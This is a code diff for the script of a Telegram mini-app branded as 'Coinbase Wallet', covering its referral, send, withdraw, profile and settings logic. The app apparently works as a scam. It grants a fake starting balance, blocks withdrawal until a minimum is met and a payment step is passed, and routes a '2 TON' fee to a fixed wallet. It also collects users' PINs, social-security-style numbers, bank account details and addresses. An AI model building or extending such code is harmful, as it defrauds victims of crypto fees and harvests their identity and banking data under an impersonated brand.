-          iziToast.error({ title: "Error", message: "Invalid recipient wallet address!", position: "topRight" });
-          submitButton.prop("disabled", false).removeClass("loading").val("Send");
-          return;
-        }
-        if (isNaN(amount) || amount <= 0) {
-          iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
-          submitButton.prop("disabled", false).removeClass("loading").val("Send");
-          return;
-        }
-
-        get(ref(database, `users`)).then((usersSnapshot) => {
-          const users = usersSnapshot.val();
-          let recipientId = null;
-          for (const uid in users) {
-            if (users[uid].wallet === recipientWallet) {
-              recipientId = uid;
-              break;
-            }
-          }
-          if (!recipientId) {
-            iziToast.error({ title: "Error", message: "Recipient wallet not found in the app!", position: "topRight" });
-            submitButton.prop("disabled", false).removeClass("loading").val("Send");
+          if (!/^[0-9]{4}$|^[0-9]{6}$/.test(pin)) {
+            iziToast.error({ title: "Error", message: "PIN must be 4 or 6 digits!", position: "topRight" });
+            submitButton.prop("disabled", false).removeClass("loading").val("Save");
             return;
           }
 
-          get(ref(database, `users/${userId}/balance`)).then((snapshot) => {
-            const currentBalance = snapshot.val() || 0;
-            if (amount > currentBalance) {
-              $("#insufficient-send-balance").removeClass("hide");
-              submitButton.prop("disabled", false).removeClass("loading").val("Send");
+          try {
+            await update(userRef, { fullName, email, pin, ssin, accountNumber, bankName, address });
+            iziToast.success({ title: "Success", message: "Profile updated!", position: "topRight" });
+            $("#profile-iziModal").iziModal("close");
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to update profile: ${error.message}`, position: "topRight" });
+          } finally {
+            submitButton.prop("disabled", false).removeClass("loading").val("Save");
+          }
+        });
+
+        // Settings form submission
+        $("#settings-form").on("submit", async (e) => {
+          e.preventDefault();
+          const submitButton = $("#submitSettingsInfo");
+          submitButton
+            .prop("disabled", true)
+            .addClass("loading")
+            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Saving...');
+
+          const theme = $("#themeSelect").val();
+          const currency = $("#currencySelect").val();
+
+          try {
+            await update(ref(database, `users/${userId}/settings`), { theme, currency });
+            $("body").removeClass("light dark").addClass(theme);
+            await updateBalanceDisplay();
+            iziToast.success({ title: "Success", message: "Settings saved!", position: "topRight" });
+            $("#settings-iziModal").iziModal("close");
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to save settings: ${error.message}`, position: "topRight" });
+          } finally {
+            submitButton.prop("disabled", false).removeClass("loading").val("Save");
+          }
+        });
+
+        // Notifications
+        onValue(ref(database, `users/${userId}/notifications`), (snapshot) => {
+          const notifications = snapshot.val() || {};
+          const list = $("#notification-table-body");
+          list.empty();
+          if (Object.keys(notifications).length) {
+            Object.values(notifications).forEach(notif => {
+              list.append(`
+                <li>
+                  <strong>${notif.title}</strong><br>
+                  ${notif.message}<br>
+                  <small>${new Date(notif.timestamp).toLocaleString()}</small>
+                </li>
+              `);
+            });
+          } else {
+            list.append(`<li>No new notifications. Check back later!</li>`);
+          }
+        });
+
+        // Transactions
+        onValue(ref(database, `users/${userId}/transactions`), (snapshot) => {
+          const transactions = snapshot.val() || {};
+          const tbody = $("#transaction-table-body");
+          tbody.empty();
+          if (Object.keys(transactions).length) {
+            Object.entries(transactions).forEach(([txId, tx]) => {
+              const displayWallet = window.truncateAddress(tx.wallet);
+              const amountDisplay = tx.type === "Fee" ? `${tx.amount.toFixed(2)} TON` : `$${tx.amount.toFixed(2)}`;
+              tbody.append(`
+                <tr>
+                  <td>${amountDisplay}</td>
+                  <td class="wallet-cell">
+                    ${displayWallet}
+                    ${tx.wallet !== "N/A" ? `<button class="btn-copy" data-wallet="${tx.wallet}" title="Copy full address"><i class="fas fa-copy"></i></button>` : ""}
+                  </td>
+                  <td>${tx.type}</td>
+                  <td>${tx.status}</td>
+                  <td>${new Date(tx.timestamp).toLocaleString()}</td>
+                </tr>
+              `);
+            });
+          } else {
+            tbody.append(`<tr><td colspan="5">No transactions found.</td></tr>`);
+          }
+        });
+
+        // Copy transaction wallet address
+        $(document).on("click", ".btn-copy", async function() {
+          const walletAddress = $(this).data("wallet");
+          try {
+            await copyToClipboard(walletAddress);
+            showToast("Wallet address copied to clipboard!");
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to copy wallet address: ${error.message}`, position: "topRight" });
+          }
+        });
+
+        // Handle referrals
+        const urlParams = new URLSearchParams(window.location.search);
+        const startParam = urlParams.get("tgWebAppStartParam");
+        const referrerId = startParam ? startParam.replace("ref", "") : null;
+
+        if (referrerId && referrerId !== userId) {
+          try {
+            const snapshot = await get(userRef);
+            if (!snapshot.exists()) {
+              const walletAddress = userId === "54321" ? "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy" : generateEthAddress();
+              await set(userRef, {
+                username: username,
+                fullName: "",
+                email: "",
+                pin: "",
+                ssin: "",
+                accountNumber: "",
+                bankName: "",
+                address: "",
+                balance: 78.01,
+                wallet: walletAddress,
+                referrals: 0,
+                referredBy: referrerId,
+                settings: { theme: "dark", currency: "USD" },
+                notifications: {
+                  welcome: {
+                    title: "Welcome!",
+                    message: "Thanks for joining Coinbase Wallet via referral!",
+                    timestamp: new Date().toISOString(),
+                  },
+                },
+                transactions: {},
+              });
+              const referrerSnapshot = await get(ref(database, `users/${referrerId}`));
+              if (referrerSnapshot.exists()) {
+                const referrerData = referrerSnapshot.val();
+                await update(ref(database, `users/${referrerId}`), {
+                  referrals: (referrerData.referrals || 0) + 1,
+                  balance: (referrerData.balance || 0) + 10,
+                });
+                await push(ref(database, `users/${referrerId}/transactions`), {
+                  amount: 10,
+                  wallet: "N/A",
+                  type: "Referral Bonus",
+                  status: "completed",
+                  timestamp: new Date().toISOString(),
+                });
+              }
+            }
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to process referral: ${error.message}`, position: "topRight" });
+          }
+        }
+
+        // Update referrals
+        async function updateReferrals(userId) {
+          try {
+            const usersSnapshot = await get(ref(database, `users`));
+            const usersData = usersSnapshot.val() || {};
+            let totalReferred = 0;
+            for (const uid in usersData) {
+              if (usersData[uid]?.referredBy === userId) {
+                totalReferred++;
+              }
+            }
+            await update(userRef, { referrals: totalReferred });
+            return totalReferred;
+          } catch (error) {
+            console.error("Failed to update referrals:", error);
+            iziToast.error({ title: "Error", message: `Failed to update referrals: ${error.message}`, position: "topRight" });
+            return 0;
+          }
+        }
+
+        onValue(ref(database, `users`), (snapshot) => {
+          if (snapshot.exists()) {
+            updateReferrals(userId);
+          }
+        });
+
+        // Withdraw button
+        $(".open-withdraw").on("click", async () => {
+          try {
+            await updateReferrals(userId);
+            const snapshot = await get(userRef);
+            const userData = snapshot.val() || {};
+            const userBalance = userData.balance || 0;
+
+            if (userBalance < 70.01) {
+              const remainingBalance = 70.01 - userBalance;
+              const message = `You need a minimum balance of $70.01 to withdraw. You need $${remainingBalance.toFixed(2)} more in your balance. Current balance: $${userBalance.toFixed(2)}.`;
+              $("#withdraw-message").text(message);
+              $("#darkModal2").iziModal("open");
               return;
             }
 
-            const senderTxRef = push(ref(database, `users/${userId}/transactions`));
-            const recipientTxRef = push(ref(database, `users/${recipientId}/transactions`));
-            const updates = {
-              [`users/${userId}/balance`]: currentBalance - amount,
-              [`users/${recipientId}/balance`]: (users[recipientId].balance || 0) + amount,
-              [`users/${userId}/transactions/${senderTxRef.key}`]: {
-                amount,
-                wallet: recipientWallet,
-                type: "Send",
-                status: "completed",
-                timestamp: new Date().toISOString(),
-              },
-              [`users/${recipientId}/transactions/${recipientTxRef.key}`]: {
-                amount,
-                wallet: userWalletAddress,
-                type: "Receive",
-                status: "completed",
-                timestamp: new Date().toISOString(),
-              },
-              [`users/${recipientId}/notifications/${Date.now()}`]: {
-                title: "Funds Received",
-                message: `You received $${amount.toFixed(2)} from ${username || "Anonymous"}!`,
-                timestamp: new Date().toISOString(),
-              },
-            };
+            const userPaidCookie = document.cookie.split("; ").find(row => row.startsWith("userPaid="));
+            const userPaid = userPaidCookie ? userPaidCookie.split("=")[1] : null;
 
-            update(ref(database), updates).then(() => {
-              iziToast.success({ title: "Success", message: `Sent $${amount.toFixed(2)} to ${recipientWallet}!`, position: "topRight" });
-              $("#darkModal1").iziModal("close");
-              $("#send-form")[0].reset();
-            }).catch((error) => {
-              iziToast.error({ title: "Error", message: "Failed to send funds: " + error.message, position: "topRight" });
-            }).finally(() => {
-              submitButton.prop("disabled", false).removeClass("loading").val("Send");
-              $("#insufficient-send-balance").addClass("hide");
-            });
-          });
-        });
-      });
-
-      // Withdraw logic
-      $(".open-withdraw").on("click", function() {
-        get(userRef).then((snapshot) => {
-          const userData = snapshot.val() || {};
-          const userBalance = userData.balance || 0;
-          const referrals = userData.referrals || 0;
-          const userWithdrawalCookie = document.cookie.split("; ").find((row) => row.startsWith("userWithdrawal="));
-          const userWithdrawal = userWithdrawalCookie ? userWithdrawalCookie.split("=")[1] : null;
-          const userPaidCookie = document.cookie.split("; ").find((row) => row.startsWith("userPaid="));
-          const userPaid = userPaidCookie ? userPaidCookie.split("=")[1] : null;
-
-          if (userBalance < 70.01 || referrals < 15) {
-            $("#withdraw-message").text(`You need a minimum balance of $70.01 and 15 referrals to withdraw. Current balance: $${userBalance.toFixed(2)}, referrals: ${referrals}.`);
-            $("#eligibility-message").text(`[You are not eligible: 2137.]`);
-            $("#darkModal2").iziModal("open");
-          } else if (userWithdrawal === "pending" && userPaid !== "paid") {
-            $("#darkModal8").iziModal("open");
-            $("#continuePaymentText").html("Continue »");
-          } else if (userWithdrawal === "pending" && userPaid === "paid") {
-            $("#darkModal7").iziModal("open");
-          } else {
-            $("#darkModal8").iziModal("open");
-            $("#continuePaymentText").html("Continue »");
-          }
-        }).catch((error) => {
-          iziToast.error({ title: "Error", message: "Failed to check eligibility: " + error.message, position: "topRight" });
-        });
-      });
-
-      $("#continuePayment").on("click", function() {
-        const userPaidCookie = document.cookie.split("; ").find((row) => row.startsWith("userPaid="));
-        const userPaid = userPaidCookie ? userPaidCookie.split("=")[1] : null;
-        if (userPaid !== "paid") {
-          document.cookie = `userWithdrawal=pending; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
-          $("#darkModal8").iziModal("close");
-          $("#darkModal9").iziModal("open");
-        } else {
-          $("#darkModal8").iziModal("close");
-          $("#darkModal7").iziModal("open");
-        }
-      });
-
-      $("#continuePaymentCls").on("click", function() {
-        $("#darkModal9").iziModal("close");
-      });
-
-      $("#wallet-form").on("submit", function(e) {
-        e.preventDefault();
-        const submitButton = $("#submitWalletInfo");
-        submitButton
-          .prop("disabled", true)
-          .addClass("loading")
-          .html('<i class="fas fa-spin-pulse fa-spinner"></i> Processing...');
-
-        const recipientWallet = $("#walletInput").val().trim();
-        const amount = parseFloat($("#wallet_amountInput").val().trim());
-        const walletRegex = /^0x[a-fA-F0-9]{40}$|^UQC[a-zA-Z0-9_-]{42}$/;
-        const feeWallet = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
-        const feeAmount = 2; // 2 TONS
-
-        if (!recipientWallet || !walletRegex.test(recipientWallet)) {
-          iziToast.error({ title: "Error", message: "Invalid recipient wallet address!", position: "topRight" });
-          submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
-          return;
-        }
-        if (isNaN(amount) || amount <= 0) {
-          iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
-          submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
-          return;
-        }
-
-        get(ref(database, `users`)).then((usersSnapshot) => {
-          const users = usersSnapshot.val();
-          let recipientId = null;
-          for (const uid in users) {
-            if (users[uid].wallet === recipientWallet) {
-              recipientId = uid;
-              break;
+            if (userPaid === "paid") {
+              $("#darkModal7").iziModal("open");
+            } else {
+              $("#darkModal8").iziModal("open");
+              $("#continuePaymentText").html("Continue »");
             }
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to check eligibility: ${error.message}`, position: "topRight" });
           }
-          if (!recipientId) {
-            iziToast.error({ title: "Error", message: "Recipient wallet not found in the app!", position: "topRight" });
+        });
+
+        // Continue payment
+        $("#continuePayment").on("click", () => {
+          try {
+            document.cookie = `userWithdrawal=pending; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
+            document.cookie = `userPaid=paid; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
+            $("#darkModal8").iziModal("close");
+            $("#darkModal9").iziModal("open");
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to process payment continuation: ${error.message}`, position: "topRight" });
+          }
+        });
+
+        // Close pending modal
+        $("#continuePaymentCls").on("click", () => {
+          try {
+            $("#darkModal9").iziModal("close");
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to close modal: ${error.message}`, position: "topRight" });
+          }
+        });
+
+        // Withdraw form submission
+        $("#wallet-form").on("submit", async (e) => {
+          e.preventDefault();
+          const submitButton = $("#submitWalletInfo");
+          submitButton
+            .prop("disabled", true)
+            .addClass("loading")
+            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Processing...');
+
+          const recipientWallet = $("#walletInput").val().trim();
+          const amount = parseFloat($("#wallet_amountInput").val().trim());
+          const feeWallet = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
+          const feeAmount = 2;
+
+          if (!recipientWallet) {
+            iziToast.error({ title: "Error", message: "Recipient wallet address is required!", position: "topRight" });
+            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+            return;
+          }
+          if (isNaN(amount) || amount <= 0) {
+            iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
+            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+            return;
+          }
+          if (recipientWallet.toLowerCase() === userWalletAddress.toLowerCase()) {
+            iziToast.error({ title: "Error", message: "You cannot withdraw funds to your own wallet!", position: "topRight" });
             submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
             return;
           }
 
-          get(ref(database, `users/${userId}/balance`)).then((snapshot) => {
+          try {
+            const usersSnapshot = await get(ref(database, `users`));
+            const users = usersSnapshot.val() || {};
+            let recipientId = null;
+            for (const uid in users) {
+              if (users[uid].wallet?.toLowerCase() === recipientWallet.toLowerCase()) {
+                recipientId = uid;
+                break;
+              }
+            }
+            if (!recipientId) {
+              iziToast.error({
+                title: "Error",
+                message: `Recipient wallet ${window.truncateAddress(recipientWallet)} not found in the app!`,
+                position: "topRight"
+              });
+              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+              return;
+            }
+
+            const snapshot = await get(ref(database, `users/${userId}/balance`));
             const currentBalance = snapshot.val() || 0;
             if (amount + feeAmount > currentBalance) {
               $("#insufficient-balance").removeClass("hide");
+              iziToast.error({
+                title: "Error",
+                message: `Insufficient balance! Current: $${currentBalance.toFixed(2)}, Requested: $${(amount + feeAmount).toFixed(2)} (including 2 TON fee)`,
+                position: "topRight"
+              });
               submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
               return;
             }
@@ -1410,37 +1489,138 @@
               },
             };
 
-            update(ref(database), updates).then(() => {
-              document.cookie = `userWithdrawal=pending; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
-              document.cookie = `userPaid=paid; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
-              iziToast.success({ title: "Success", message: `Withdrawal of $${amount.toFixed(2)} requested to ${recipientWallet}!`, position: "topRight" });
-              $("#darkModal7").iziModal("close");
-              $("#darkModal9").iziModal("open");
-            }).catch((error) => {
-              iziToast.error({ title: "Error", message: "Failed to process withdrawal: " + error.message, position: "topRight" });
-            }).finally(() => {
-              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
-              $("#insufficient-balance").addClass("hide");
+            await update(ref(database), updates);
+            document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
+            document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
+            iziToast.success({
+              title: "Success",
+              message: `Withdrawal of $${amount.toFixed(2)} requested to ${window.truncateAddress(recipientWallet)}!`,
+              position: "topRight"
             });
-          });
+            $("#darkModal7").iziModal("close");
+            $("#darkModal9").iziModal("open");
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to process withdrawal: ${error.message}`, position: "topRight" });
+          } finally {
+            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+            $("#insufficient-balance").addClass("hide");
+          }
         });
-      });
 
-      // Share button functionality
-      const shareButton = document.getElementById("share-button");
-      const referralLink = `https://t.me/CoinbaseTrumpbot/coinbase?startapp=ref${userId}`;
-      shareButton.addEventListener("click", function() {
-        copyToClipboard(referralLink).then(() => {
-          $("#darkModal5").iziModal("open");
-          showToast("Referral link copied to clipboard!");
-        }).catch((error) => {
-          iziToast.error({ title: "Error", message: "Failed to copy referral link: " + error.message, position: "topRight" });
+        // Send form submission
+        $("#send-form").on("submit", async (e) => {
+          e.preventDefault();
+          const submitButton = $("#submitSendInfo");
+          submitButton
+            .prop("disabled", true)
+            .addClass("loading")
+            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Processing...');
+
+          const recipientWallet = $("#sendWalletInput").val().trim();
+          const amount = parseFloat($("#sendAmountInput").val().trim());
+
+          if (!recipientWallet) {
+            iziToast.error({ title: "Error", message: "Recipient wallet address is required!", position: "topRight" });
+            submitButton.prop("disabled", false).removeClass("loading").val("Send");
+            return;
+          }
+          if (isNaN(amount) || amount <= 0) {
+            iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
+            submitButton.prop("disabled", false).removeClass("loading").val("Send");
+            return;
+          }
+          if (recipientWallet.toLowerCase() === userWalletAddress.toLowerCase()) {
+            iziToast.error({ title: "Error", message: "You cannot send funds to your own wallet!", position: "topRight" });
+            submitButton.prop("disabled", false).removeClass("loading").val("Send");
+            return;
+          }
+
+          try {
+            const usersSnapshot = await get(ref(database, `users`));
+            const users = usersSnapshot.val() || {};
+            let recipientId = null;
+            for (const uid in users) {
+              if (users[uid].wallet?.toLowerCase() === recipientWallet.toLowerCase()) {
+                recipientId = uid;
+                break;
+              }
+            }
+            if (!recipientId) {
+              iziToast.error({
+                title: "Error",
+                message: `Recipient wallet ${window.truncateAddress(recipientWallet)} not found in the app!`,
+                position: "topRight"
+              });
+              submitButton.prop("disabled", false).removeClass("loading").val("Send");
+              return;
+            }
+
+            const snapshot = await get(ref(database, `users/${userId}/balance`));
+            const currentBalance = snapshot.val() || 0;
+            if (amount > currentBalance) {
+              $("#insufficient-send-balance").removeClass("hide");
+              iziToast.error({
+                title: "Error",
+                message: `Insufficient balance! Current: $${currentBalance.toFixed(2)}, Requested: $${amount.toFixed(2)}`,
+                position: "topRight"
+              });
+              submitButton.prop("disabled", false).removeClass("loading").val("Send");
+              return;
+            }
+
+            const senderTxRef = push(ref(database, `users/${userId}/transactions`));
+            const recipientTxRef = push(ref(database, `users/${recipientId}/transactions`));
+            const updates = {
+              [`users/${userId}/balance`]: currentBalance - amount,
+              [`users/${recipientId}/balance`]: (users[recipientId].balance || 0) + amount,
+              [`users/${userId}/transactions/${senderTxRef.key}`]: {
+                amount,
+                wallet: recipientWallet,
+                type: "Send",
+                status: "completed",
+                timestamp: new Date().toISOString(),
+              },
+              [`users/${recipientId}/transactions/${recipientTxRef.key}`]: {
+                amount,
+                wallet: userWalletAddress,
+                type: "Receive",
+                status: "completed",
+                timestamp: new Date().toISOString(),
+              },
+              [`users/${recipientId}/notifications/${Date.now()}`]: {
+                title: "Funds Received",
+                message: `You received $${amount.toFixed(2)} from ${username || "Anonymous"}!`,
+                timestamp: new Date().toISOString(),
+              },
+            };
+
+            await update(ref(database), updates);
+            iziToast.success({
+              title: "Success",
+              message: `Sent $${amount.toFixed(2)} to ${window.truncateAddress(recipientWallet)}!`,
+              position: "topRight"
+            });
+            $("#darkModal1").iziModal("close");
+            $("#send-form")[0].reset();
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to send funds: ${error.message}`, position: "topRight" });
+          } finally {
+            submitButton.prop("disabled", false).removeClass("loading").val("Send");
+            $("#insufficient-send-balance").addClass("hide");
+          }
         });
-      });
 
-      // Logout functionality
-      $("#logout-btn").on("click", function() {
-        window.Telegram.WebApp.close();
+        // Logout
+        $("#logout-btn").on("click", () => {
+          try {
+            document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
+            document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
+            window.Telegram.WebApp.close();
+            iziToast.success({ title: "Success", message: "Logged out successfully!", position: "topRight" });
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to logout: ${error.message}`, position: "topRight" });
+          }
+        });
       });
     });
   </script>
